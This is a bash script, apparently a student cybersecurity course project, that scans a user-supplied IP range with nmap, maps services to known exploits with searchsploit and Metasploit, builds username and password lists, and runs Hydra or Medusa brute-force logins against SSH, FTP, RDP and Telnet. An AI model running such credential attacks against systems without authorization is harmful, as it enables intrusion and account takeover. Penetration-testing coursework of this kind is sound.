#!/bin/bash
#//--------------------------------------------------------------
#// WILSON LAU SCRIPT                  ^__^
#// PROJECT:INFO EXTRACTOR             (oo)\_______
#// STUDENT ID : S16                   (__)\       )\/\
#// CLASS: CFC190324                       ||----w||
#// LECTURER: SAMSON XIAO                  ||     ||
#//--------------------------------------------------------------
#==================================================================
# Define font color variables & script permission
#==================================================================
W='\033[1;37m'
Y='\033[1;33m'
C='\033[0;36m'
R='\033[1;31m'
LG='\033[0;37m'

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then 
  echo -e "\n${R}======================================================${C}"
  echo -e "${R}This script must be run as root. Please run it with 'sudo'."
  echo -e "${R}======================================================${C}\n"
  exit 1
fi

#==================================================================
# Startup script message
#==================================================================
function startup_message(){
    echo -e "\n${R}======================================================${C}"
    figlet " Welcome to Vulnerability Scanner"
    echo -e "${R}======================================================\n"
    sleep 4
    validate_ip
}

#==================================================================
# Function to validate IP/Network input
#==================================================================
function validate_ip() {
    while true; do
        echo -e "${Y}Enter the IP / Network to scan (E.g 192.168.1.0/24):${C}"
        read ip
        sleep 2 
        if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(/[0-9]+)?$ ]]; then
            break
        else
            echo -e "${R}Invalid IP/Network format. Please input correct IP/format. "
        fi
    done
    create_dir
}

#==================================================================
# Function to create directory if it doesn't exist
#==================================================================
function create_dir() {
    while true; do
        echo -e "\n${Y}Enter a directory for log saving: ${C}"
        read saved_dir
        sleep 2
        if [ ! -d "$saved_dir" ]; then
            mkdir -p "$saved_dir"
            chmod 777 "$saved_dir"
            mkdir -p "$saved_dir/tmp"
            echo -e "${Y}Directory created: ${LG}$saved_dir"
            sleep 2
            break
        else
            echo -e "\n${R}Directory already exists: ${LG}$saved_dir"
            echo -e "\n${Y}Do you want to use the existing directory? (y/n): ${C}"
            read use_existing
            sleep 2
            if [[ "$use_existing" =~ ^[Yy]$ ]]; then
                break
            else
                echo -e "${R}Please enter a different directory name."
                sleep 2
            fi
        fi
    done
    trap 'rm -rf "$saved_dir/tmp"' EXIT
    scan_network
}

#==================================================================
# Function to scan the network
#==================================================================
function scan_network() {
	while true; do
		echo -e "\n${Y}Choose scan type ${LG}(Basic / Full): ${C}" 
		read scan_type
		sleep 2

		# Check if the input is valid
		if [ "$scan_type" == "Basic" ] || [ "$scan_type" == "Full" ]; then
			break
		else
			echo -e "\n${R}Invalid input! Please choose either 'Basic' or 'Full'.${C}"
			sleep 2
		fi
	done

	echo -e "\n\n${R}======================================================${C}"
	figlet " Scanning network ..."
	echo -e "${R}======================================================\n"
	echo -e "${Y}Scanning network. Please hold on ($scan_type)... ${C}" 
	sleep 4

	if [ "$scan_type" == "Basic" ]; then
		sudo nmap -sV -oX "$saved_dir/tmp/${ip}_basic_scan_results.xml" "$ip" > /dev/null 2>&1
		xsltproc -o "$saved_dir/${ip}_basic_scan_results.html" /usr/share/nmap/nmap.xsl "$saved_dir/tmp/${ip}_basic_scan_results.xml" > /dev/null 2>&1
		echo -e "${Y}Nmap scan completed! Log file saved at ${LG}$saved_dir/${ip}_basic_scan_results.html "
	elif [ "$scan_type" == "Full" ]; then
		sudo nmap -A -oX "$saved_dir/tmp/${ip}_full_scan_results.xml" "$ip" > /dev/null 2>&1
		xsltproc -o "$saved_dir/${ip}_full_scan_results.html" /usr/share/nmap/nmap.xsl "$saved_dir/tmp/${ip}_full_scan_results.xml" > /dev/null 2>&1
		echo -e "\n${Y}Nmap scan completed! "
		echo -e "Nmap log file saved at ${LG}$saved_dir/${ip}_full_scan_results.html ."
		sleep 4

		echo -e "\n\n${R}======================================================${C}"
		figlet " Vulnerabilities Scanning ..."
		echo -e "${R}======================================================"
		echo -e "\n${Y}Scanning vulnerabilities based on services found... "
		sleep 4
		run_vuln_assessment  
	fi
}

#==================================================================
# Function to run vulnerability assessment
#==================================================================
function run_vuln_assessment() {
	echo -e "\n${Y}Mapping vulnerabilities based on services found... "
    sleep 3
    searchsploit --nmap "$saved_dir/tmp/${ip}_full_scan_results.xml" 2>/dev/null | sed -r 's/\x1B\[[0-9;]*[mK]//g' | sed -r 's/\x0F//g' > "$saved_dir/tmp/searchsploit_results.txt"
	convert_searchsploit_result
    msfconsole -q -x "db_import $saved_dir/tmp/${ip}_full_scan_results.xml; vulns; exit" > "$saved_dir/tmp/msf_vuln_scan.txt"
	convert_msf_result
	echo -e "\n${Y}Vulnerability assessment complete! Results saved at: ${LG}${saved_dir}/searchsploit_results_scan.html , ${saved_dir}/msf_vuln_scan.html ."
	sleep 3
	convert_searchsploit_result
}

#==================================================================
# Function to convert Searchsploit results to HTML
#==================================================================
function convert_searchsploit_result() {
	awk 'BEGIN {
		print "<html><head><title>Searchsploit Vulnerability Scan Results</title></head><body><pre>"
	}
	{
    print
	}
	END {
		print "</pre></body></html>"
	}' "$saved_dir/tmp/searchsploit_results.txt" > "$saved_dir/searchsploit_results_scan.html"
}

#==================================================================
# Function to convert MSF results to HTML
#==================================================================
function convert_msf_result() {
	awk 'BEGIN {
		print "<html><head><title>Metasploit Vulnerability Scan Results</title></head><body><pre>"
	}
	{
    print
	}
	END {
		print "</pre></body></html>"
	}' "$saved_dir/tmp/msf_vuln_scan.txt" > "$saved_dir/msf_vuln_scan.html"
	parse_discovered_services
}

#==================================================================
# Function to parse discovered services capable of brute-forcing
#==================================================================
function parse_discovered_services() {
    echo -e "\n${Y}Parsing discovered services for brute-force capability...\n "
    sleep 4
    discovered_services=()

    if [ -f "$saved_dir/tmp/${ip}_basic_scan_results.xml" ]; then
        scan_results_file="$saved_dir/tmp/${ip}_basic_scan_results.xml"
    elif [ -f "$saved_dir/tmp/${ip}_full_scan_results.xml" ]; then
        scan_results_file="$saved_dir/tmp/${ip}_full_scan_results.xml"
    else
        echo -e "${Y}No scan results file found. Please run a scan first. "
        return
    fi

    if grep -iq "ssh" "$scan_results_file"; then
        discovered_services+=("SSH")
    fi
    if grep -iq "ftp" "$scan_results_file"; then
        discovered_services+=("FTP")
    fi
    if grep -iq "rdp" "$scan_results_file"; then
        discovered_services+=("RDP")
    fi
    if grep -iq "telnet" "$scan_results_file"; then
        discovered_services+=("Telnet")
    fi

    if [ ${#discovered_services[@]} -eq 0 ]; then
        echo -e "\n${R}No services found that can be brute-forced."
    else
		echo -e "${R}======================================================"
        echo -e "${Y}Discovered services that can be brute-forced:"
        echo -e "${R}======================================================\n"
        sleep 3
        for i in "${!discovered_services[@]}"; do
            echo -e "${LG}$((i+1)). ${discovered_services[i]}"
            sleep 2
        done
        echo -e "\n${Y}Choose a service to brute-force (enter the number): ${C}"
        read service_op
        selected_service=${discovered_services[$((service_op-1))]}
        echo -e "\n${Y}You selected: ${LG}$selected_service${WHITE}"
    fi
    get_password_list
}

#==================================================================
# Function to generate or use an existing user list
#==================================================================
function get_password_list() {
	echo -e "\n${Y}Do you have your own user list? ${W}(y/n):${C}"
    read own_user_list
    if [[ "$own_user_list" == "y" || "$own_user_list" == "Y" ]]; then
        echo -e "\n${G}Enter the path to your user list:${C}"
        read user_list
    else
        user_list="$saved_dir/generated_user_list.lst"
        echo -e "\n${Y}Generating user list with crunch... "
        sleep 3
        crunch 4 4 user -o "$user_list" -c 3 > /dev/null 2>&1
        echo "admin" >> "$user_list"
        echo "msfadmin" >> "$user_list"
        echo "root" >> "$user_list"
        echo -e "\n${Y}Generated user list: ${LG}$user_list"
        sleep 3
    fi

    echo -e "\n${Y}Do you have your own password list? ${W}(y/n):${C}"
    read own_password_list
    if [[ "$own_password_list" == "y" || "$own_password_list" == "Y" ]]; then
        echo -e "\n${G}Enter the path to your password list:${C}"
        read password_list
    else
        password_list="$saved_dir/generated_password_list.lst"
        echo -e "\n${Y}Generating password list with crunch... "
        sleep 3
        crunch 4 4 toor -o "$password_list" -c 4 > /dev/null 2>&1
        echo "msfadmin" >> "$password_list"
        echo -e "\n${Y}Generated password list: ${LG}$password_list "
        sleep 3
    fi
    check_weak_credentials
}

#==================================================================
# Function to check weak credentials using Hydra or Medusa
#==================================================================
function check_weak_credentials() {
    if [ -z "$selected_service" ]; then
        echo -e "\n${R}No service selected for brute-forcing. Skipping this step."
        return
    fi
    echo -e "\n${Y}Choose a method to brute-force $selected_service: ${LG}"
    sleep 2
    echo -e "1. Hydra"
    sleep 2
    echo -e "2. Medusa"
    sleep 2
    echo -e "\n${Y}Choose a tool: ${LG}"
    read method_op
    case $method_op in
        1)
            brute_force_method="Hydra"
            ;;
        2)
            brute_force_method="Medusa"
            ;;
        *)
            echo -e "\n${Y}Invalid option selected. Defaulting to Hydra."
            brute_force_method="Hydra"
            ;;
    esac

    echo -e "\n${Y}Starting brute-force attack on $selected_service using $brute_force_method..."
    case $selected_service in
        "SSH")
            if [ "$brute_force_method" == "Hydra" ]; then
                echo -e "\n${R}Hydra not able to brute-force without SSH KEY. Try Medusa to bypass."
                check_weak_credentials
            else
                medusa -U "$user_list" -P "$password_list" -h $ip -M ssh -v 6 -O "$saved_dir/ssh_bruteforce_results.txt" > /dev/null 2>&1
                if grep -q "SUCCESS" "$saved_dir/ssh_bruteforce_results.txt"; then
					echo -e "\n${R}*******************************************"
                    echo -e "LOGIN CREDENTIAL FOUND!"
                    grep "SUCCESS" "$saved_dir/ssh_bruteforce_results.txt" | awk '{print $(NF-4), $(NF-3), $(NF-2), $(NF-1), $NF}'
					echo -e "*******************************************"
                else
                    echo -e "\n${R}Bruteforce no success."
                fi
                sleep 4
            fi
            ;;
        "FTP")
            if [ "$brute_force_method" == "Hydra" ]; then
                hydra -L "$user_list" -P "$password_list" ftp://$ip -f -o "$saved_dir/ftp_bruteforce_results.txt" > /dev/null 2>&1
            else
                medusa -U "$user_list" -P "$password_list" -h $ip -M ftp -v 6 -O "$saved_dir/ftp_bruteforce_results.txt" > /dev/null 2>&1
            fi
            if grep -q "SUCCESS" "$saved_dir/ftp_bruteforce_results.txt"; then
                echo -e "${R}*******************************************"
                echo -e "${R}LOGIN CREDENTIAL FOUND!"
                grep "SUCCESS" "$saved_dir/ftp_bruteforce_results.txt" | awk '{print $(NF-4), $(NF-3), $(NF-2), $(NF-1), $NF}'
				echo -e "*******************************************"
            else
                echo -e "\n${R}Bruteforce no success."
            fi
            sleep 4
            ;;
        "RDP")
            if [ "$brute_force_method" == "Hydra" ]; then
                hydra -L "$user_list" -P "$password_list" rdp://$ip -f -o "$saved_dir/rdp_bruteforce_results.txt" > /dev/null 2>&1
            else
                medusa -U "$user_list" -P "$password_list" -h $ip -M rdp -v 6 -O "$saved_dir/rdp_bruteforce_results.txt" > /dev/null 2>&1
            fi
            if grep -q "SUCCESS" "$saved_dir/rdp_bruteforce_results.txt"; then
                echo -e "${R}*******************************************"
                echo -e "LOGIN CREDENTIAL FOUND!"
                grep "SUCCESS" "$saved_dir/rdp_bruteforce_results.txt" | awk '{print $(NF-4), $(NF-3), $(NF-2), $(NF-1), $NF}'
				echo -e "*******************************************"
            else
                echo -e "\n${R}Bruteforce no success."
            fi
            sleep 4
            ;;
        "Telnet")
            if [ "$brute_force_method" == "Hydra" ]; then
                hydra -L "$user_list" -P "$password_list" telnet://$ip -T 5 -t 1 -f -o "$saved_dir/telnet_bruteforce_results.txt" > /dev/null 2>&1
            else
                echo -e "\n${R}Medusa not able to brute-force telnet. Try Hydra instead."
                check_weak_credentials
            fi
            if grep -q "SUCCESS" "$saved_dir/telnet_bruteforce_results.txt"; then
                echo -e "${R}*******************************************"
                echo -e "\n${R}LOGIN CREDENTIAL FOUND!"
                grep "SUCCESS" "$saved_dir/telnet_bruteforce_results.txt" | awk '{print $(NF-4), $(NF-3), $(NF-2), $(NF-1), $NF}'
				echo -e "*******************************************"
            else
                echo -e "\n${R}Bruteforce no success."
            fi
            sleep 4
            ;;
        *)
            echo -e "${R}Unsupported service selected. No brute-force attack performed."
            ;;
    esac

    echo -e "\n\n${Y}Brute-force attack completed! Results saved in ${LG}$saved_dir/${selected_service,,}_bruteforce_results.txt"
	sleep 4
	show_log_files
}

#==================================================================
# Function to display saved log files
#==================================================================
function show_log_files() {
	echo -e "\n\n${R}======================================================${C}"
    figlet " Logs Files..."
    echo -e "${R}======================================================\n"
    
    echo -e "\n${Y}The following files have been saved: "
    
    if [ "$scan_type" == "Basic" ]; then
        echo -e "${Y}1. Basic scan results (HTML): ${LG}$saved_dir/${ip}_basic_scan_results.html "
    elif [ "$scan_type" == "Full" ]; then
        echo -e "${Y}1. Full scan results (HTML): ${LG}$saved_dir/${ip}_full_scan_results.html "
        echo -e "${Y}2. Searchsploit vulnerability results (HTML): ${LG}$saved_dir/searchsploit_results_scan.html "
        echo -e "${Y}3. Metasploit vulnerability results (HTML): ${LG}$saved_dir/msf_vuln_scan.html "
    fi

    if [ -f "$saved_dir/${selected_service,,}_bruteforce_results.txt" ]; then
        echo -e "${Y}4. Brute-force results ($selected_service): ${LG}$saved_dir/${selected_service,,}_bruteforce_results.txt "
    fi

    if [ "$own_password_list" != "y" ] && [ -f "$password_list" ]; then
        echo -e "${Y}5. Generated password list: ${LG}$password_list "
    fi
    
    echo -e "\n${Y}Would you like to search for a specific term within the log files? (y/n): ${C}"
    read search_choice
    if [[ "$search_choice" =~ ^[Yy]$ ]]; then
        echo -e "${Y}Enter the search term or pattern: ${C}"
        read search_term
        echo -e "\n${Y}Searching for '${LG}$search_term${Y}' in log files...\n"
        grep -i "$search_term" "$saved_dir"/* | tee "$saved_dir/search_results.txt"
        echo -e "\n${Y}Search results saved to: ${LG}$saved_dir/search_results.txt"
    fi
    sleep 4
    handle_user_choices
}

#==================================================================
# Function to handle user choices for viewing logs or going back
#==================================================================
function handle_user_choices() {
    while true; do
		figlet "        Menu "
		echo -e "${R}======================================================\n"
		sleep 2
        echo -e "\n${Y}Choose an option : ${Y}"
        echo -e "1. Restart the script"
        echo -e "2. Choose another service to brute-force"
        echo -e "3. Do another brute-force method"
        
        if [ "$scan_type" == "Full" ]; then
            echo -e "4. View Full Scan Results"
            echo -e "5. View Searchsploit Results"
            echo -e "6. View Metasploit Results"
        fi
        if [ -f "$saved_dir/${selected_service,,}_bruteforce_results.txt" ]; then
            echo -e "7. View Brute-force Results"
        fi
        echo -e "8. Zip all output results into zip file."
        echo -e "0. Exit"        
        read -p "Enter your choice: " user_choice
        
        case $user_choice in
            1)
                validate_ip
                ;;
            2)
            	parse_discovered_services
				;;
			3)
            	check_weak_credentials
				;;
            4)
                if [ "$scan_type" == "Full" ]; then
                    xdg-open "$saved_dir/${ip}_full_scan_results.html"
                else
                    echo -e "\n${R}Invalid choice. "
                fi
                ;;
            5)
                if [ "$scan_type" == "Full" ]; then
                    xdg-open "$saved_dir/searchsploit_results_scan.html"
                else
                    echo -e "\n${R}Invalid choice. "
                fi
                ;;
            6)
                if [ "$scan_type" == "Full" ]; then
                    xdg-open "$saved_dir/msf_vuln_scan.html"
                else
                    echo -e "\n${R}Invalid choice. "
                fi
                ;;
            7)
                if [ -f "$saved_dir/${selected_service,,}_bruteforce_results.txt" ]; then
                    xdg-open "$saved_dir/${selected_service,,}_bruteforce_results.txt"
                else
                    echo -e "\n${R}Invalid choice. "
                fi
                ;;
            8)
                echo -e "\n${Y}Zipping all output results..."
                rm -rf "$saved_dir/tmp/"
                zip_file="$saved_dir/log_files_$(date +%Y%m%d%H%M%S).zip"
                zip -r "$zip_file" "$saved_dir"/* > /dev/null 2>&1
                sleep 3
                echo -e "${R}======================================================\n"
                echo -e "\n${Y}All log files have been zipped into: ${LG}$zip_file"
                echo -e "${R}======================================================\n"
                sleep 5
                ;;
            0)
                echo -e "\n${R}Exiting the script now. Goodbye =) ..."
                break
                ;;
            *)
                echo -e "\n${R}Invalid option selected. Please try again. "
                ;;
        esac
    done
    
}

#==================================================================
# End of Functions
#==================================================================
# Start the script
startup_message

